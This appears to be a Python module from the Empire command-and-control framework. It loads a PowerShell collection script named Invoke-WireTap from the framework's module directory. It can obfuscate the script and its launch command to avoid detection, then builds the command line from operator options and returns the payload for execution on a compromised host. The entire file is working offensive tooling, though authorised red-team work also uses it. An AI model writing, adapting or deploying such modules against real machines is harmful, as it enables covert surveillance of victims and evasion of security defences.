from __future__ import print_function

from builtins import object
from builtins import str
from typing import Dict

from empire.server.common import helpers
from empire.server.common.module_models import PydanticModule
from empire.server.utils import data_util
from empire.server.utils.module_util import handle_error_message


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
        # First method: Read in the source script from module_source
        module_source = main_menu.installPath + "/data/module_source/collection/Invoke-WireTap.ps1"
        if obfuscate:
            data_util.obfuscate_module(moduleSource=module_source, obfuscationCommand=obfuscation_command)
            module_source = module_source.replace("module_source", "obfuscated_module_source")
        try:
            f = open(module_source, 'r')
        except:
            return handle_error_message("[!] Could not read module source path at: " + str(module_source))

        module_code = f.read()
        f.close()

        script = module_code
        script_end = 'Invoke-WireTap -Command "'

        # Add any arguments to the end execution of the script
        for option, values in params.items():
            if option.lower() != "agent":
                if values and values != '':
                    if values.lower() == "true":
                        # if we're just adding a switch
                        script_end += str(option)
                    elif option.lower() == "time":
                        # if we're just adding a switch
                        script_end += " " + str(values)
                    else:
                        script_end += " " + str(option) + " " + str(values)
        script_end += '"'

        if obfuscate:
            script_end = helpers.obfuscate(psScript=script_end, installPath=main_menu.installPath,
                                           obfuscationCommand=obfuscation_command)
        script += script_end
        script = data_util.keyword_obfuscation(script)

        return script
